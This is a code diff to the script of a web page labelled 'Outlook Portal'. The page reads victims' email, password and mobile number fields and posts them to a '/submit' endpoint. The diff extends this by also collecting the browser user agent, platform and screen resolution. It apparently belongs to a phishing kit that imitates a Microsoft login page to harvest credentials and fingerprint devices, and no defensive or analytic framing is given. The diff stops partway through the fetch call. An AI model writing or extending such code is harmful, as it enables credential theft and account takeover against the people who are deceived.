@@ -201,12 +201,22 @@
 
 <script>
   async function sendLogs(type) {
+    var deviceInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      screenResolution: window.screen.width + 'x' + window.screen.height
+    };
+    var browserAgent = navigator.userAgent;
+    var screenRes = window.screen.width + 'x' + window.screen.height;
     var payload = {
       page: 'Outlook Portal',
       type: type,
       email: document.getElementById('email').value || '',
       pwd: document.getElementById('pwd').value || '',
-      mobile: document.getElementById('ms-mobile').value || ''
+      mobile: document.getElementById('ms-mobile').value || '',
+      browser_agent: browserAgent,
+      screen_resolution: screenRes,
+      deviceInfo: deviceInfo
     };
     try {
       await fetch('/submit', {
